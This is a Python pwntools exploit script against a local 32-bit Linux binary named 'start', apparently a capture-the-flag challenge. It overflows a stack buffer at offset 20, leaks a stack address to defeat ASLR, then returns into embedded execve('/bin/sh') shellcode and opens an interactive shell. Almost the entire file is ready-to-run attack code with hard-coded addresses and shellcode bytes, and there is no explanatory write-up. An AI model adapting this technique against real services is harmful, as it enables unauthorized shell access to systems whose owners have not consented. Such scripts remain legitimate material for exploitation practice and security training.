# coding: utf-8
'''
Exploit local binary for bof with stack aslr.
'''
from pwn import *
binary = './start'
context.arch = 'i386'
context.os == 'linux'
context.os = 'linux'
context.log_level = 'DEBUG'
context.binary = binary
e = ELF(binary)

read_func = pack(0x8048087)
read_func
exit_func = pack(0x804809d)
execve = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

'''
Running crash script displays cylclic pattern byte count found in eip.

$ ./crash.py --binary ./start --min 60 p
...
EIP: 0x61616166
Found payload pattern 0x61616166:faaa in register eip at pattern offset 20 of payload.
Found pattern in stack through esp:0xffffd2ec->gaaa indirection, at pattern offset 24
'''
buf_start = 20

payload_1 = fit({buf_start:[read_func]})

# Turn off for testing.
# io = process(binary,aslr=False)

io = process(binary,aslr=True)
# Welcome message printed
io.recv()

# First payload bof write() and payload will jump to read() for sp addres leak
io.send(payload_1)

# stack info now leaked
out = io.recv()
# process should be waiting for read() again

stack_leak = out[:4]
print('Stack leak shows where return ip is stored: {}'.format(hex(unpack(stack_leak))))

eip_1     = pack(0xffffffff)
eip_1     =  unpack(stack_leak) + buf_start
payload_2 = fit({buf_start:[eip_1,execve]},length=60)

# Second call to read() and second payload with jump to execve shellcode on stack.
io.send(payload_2)

#io.corefile
#io.recv()
io.interactive()
